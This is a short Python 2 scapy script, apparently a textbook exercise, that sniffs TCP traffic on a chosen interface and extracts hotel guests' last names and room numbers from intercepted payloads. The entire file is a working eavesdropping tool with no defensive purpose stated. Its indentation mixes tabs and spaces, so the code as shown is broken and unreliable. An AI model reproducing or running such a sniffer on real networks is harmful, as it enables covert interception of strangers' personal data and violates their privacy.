#!/usr/bin/python
# -*- coding: utf-8 -*-

import optparse
from scapy.all import *

# Determines if intercepted packet contains any personal info.
def findGuest(pkt):
	# Copies the raw contents of the payload to a variable named raw
    raw = pkt.sprintf('%Raw.load%')
    # Builds a reg ex for Last names and room guest numbers
	name = re.findall('(?i)LAST_NAME=(.*)&', raw)
    room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)
    if name:
        print '[+] Found Hotel Guest ' + str(name[0])+\
          ', Room #' + str(room[0])


def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-i <interface>')
    parser.add_option('-i', dest='interface',\
       type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        # Identify the interface to capture traffic
		conf.iface = options.interface

    try:
        print '[*] Starting Hotel Guest Sniffer.'
        # Sniffer listens for traffic using the sniff() function,
		# filters only TCP traffic and forwards all packets to
		# the to findGuest() procedure
		sniff(filter='tcp', prn=findGuest, store=0)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()
